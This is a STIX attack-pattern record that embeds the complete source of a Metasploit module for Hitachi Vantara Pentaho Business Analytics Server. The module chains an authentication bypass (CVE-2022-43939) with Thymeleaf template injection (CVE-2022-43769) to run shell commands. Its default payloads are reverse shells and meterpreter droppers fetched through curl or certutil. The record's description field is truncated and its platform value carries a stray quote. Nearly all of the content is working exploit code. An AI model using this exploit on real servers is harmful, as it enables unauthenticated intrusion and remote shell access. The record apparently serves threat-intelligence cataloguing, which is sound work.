{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d569ba38-5ff5-4886-ba6a-24dfb02049c4",
    "created": "2024-08-14T17:09:21.859843Z",
    "modified": "2024-08-14T17:09:21.859848Z",
    "name": "Pentaho Business Server Auth Bypass and Server Side Template Injection RCE",
    "description": " Hitachi Vantara Pentaho Business Analytics Server prior to versions 9.4.0.1 and 9.3.0.2, including 8.3.x is",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/pentaho_business_server_authbypass_and_ssti.rb",
            "external_id": "pentaho_business_server_authbypass_and_ssti.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-43939#AuthBypass"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Pentaho Business Server Auth Bypass and Server Side Template Injection RCE',\n        'Description' => %q{\n          Hitachi Vantara Pentaho Business Analytics Server prior to versions 9.4.0.1 and 9.3.0.2, including 8.3.x is\n          vulnerable to an authentication bypass (CVE-2022-43939) and a Server Side Template Injection (SSTI) vulnerability\n          (CVE-2022-43769) that can be chained together to achieve unauthenticated code execution as the user\n          running the Pentaho Business Analytics Server.\n\n          The first vulnerability (CVE-2022-43939) is an authentication bypass which stems from a regex that allows any\n          URL that ends in \"/\", followed by \"require\", optionally \"-js\" or \"-cfg\", any character, and then the string\n          \"js\" followed optionally by \"?\" and then any characters of the attacker's choice.\n\n          The second (CVE-2022-43769) is a server side\n          template injection. This vulnerability allows RCE by making a GET request to /api/ldap/config/ldapTreeNodeChildren and\n          setting the url parameter to ThymeLeaf template code. By abusing the ability to execute arbitrary Java classes within\n          Thymeleaf templates, an attacker can execute arbitrary commands as the user running the Pentaho Business Analytics Server.\n        },\n        'Author' => [\n          'Harry Withington', # Discovery\n          'dwbzn', # PoC\n          'jheysel-r7' # Module\n        ],\n        'References' => [\n          ['URL', 'https://github.com/dwbzn/pentaho-exploits/blob/main/cve-2022-43769.py'], # POC\n          ['URL', 'https://research.aurainfosec.io/pentest/pentah0wnage/'], # Original writeup\n          ['URL', 'https://support.pentaho.com/hc/en-us/articles/14455561548301'], # Advisory\n          ['CVE', '2022-43769'], # RCE\n          ['CVE', '2022-43939']  # Auth Bypass\n        ],\n        'License' => MSF_LICENSE,\n        'Privileged' => false,\n        'Platform' => ['win', 'unix'],\n        'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_openssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => :curl,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'CmdStagerFlavor' => :certutil,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'\n              }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-04-04',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Base path', '/pentaho'])\n      ]\n    )\n  end\n\n  def check\n    # This check method abuses the authentication bypass vulnerability CVE-2022-43939 to check exploitability. Due to a\n    # bad regex in applicationContext-spring-security.xml endpoints that should not be accessible without authentication\n    # are made accessible if the URL ends in \"/\", followed by \"require\", optionally \"-js\" or \"-cfg\", any character,\n    # and then the string \"js\" followed optionally by \"?\" and then any characters of the attacker's choice.\n\n    post_require_mixup = ['-cfg', '-js', ''].sample\n    period_mixup = ['.', Rex::Text.rand_text_alphanumeric(1)].sample\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'api', 'ldap', 'config', 'ldapTreeNodeChildren', \"require#{post_require_mixup}#{period_mixup}js\")\n    )\n\n    return Exploit::CheckCode::Unknown unless res\n\n    if res.code == 200 && res.body == '{}'\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def win_target?\n    target.platform.names.include?('Windows')\n  end\n\n  def execute_command(cmd, _opts = {})\n    java_payload = <<~JAVA.gsub(/^\\s+/, '').tr(\"\\n\", '')\n      {T(java.lang.Runtime).getRuntime().exec(\n        new String[]{ #{win_target? ? '\"cmd.exe\", \"/c\", ' : '\"/bin/sh\", \"-c\", '}'#{cmd.gsub(\"'\", \"''\")}'}\n        )\n      }\n    JAVA\n\n    post_require_mixup = ['-cfg', '-js', ''].sample\n    period_mixup = ['.', Rex::Text.rand_text_alphanumeric(1)].sample\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'api', 'ldap', 'config', 'ldapTreeNodeChildren', \"require#{post_require_mixup}#{period_mixup}js\"),\n      'vars_get' => {\n        'url' => \"##{java_payload}\",\n        'mgrDn' => Rex::Text.rand_text_alphanumeric(1..24),\n        'pwd' => Rex::Text.rand_text_alphanumeric(1..24)\n      },\n      'uri_encode_mode' => 'hex-all' # Needed to encode \\ as %5C so we don't run into bad character issues that cause failure on server.\n    )\n\n    unless res\n      fail_with(Failure::UnexpectedReply, 'No response from the server when attempting to exploit')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Unexpected response code:#{res.code}, when attempting to exploit\")\n    end\n\n    unless res.body == 'false'\n      fail_with(Failure::UnexpectedReply, \"The response body from the exploit attempt indicates the attempt was\n                                          unsuccessful. The response body should only contain 'false'. The response body\n                                          returned was: '#{res.body}'\")\n    end\n  end\n\n  def exploit\n    print_status('Attempting to exploit...')\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :win_dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-04-04",
    "x_mitre_platforms": [
        "win'"
    ]
}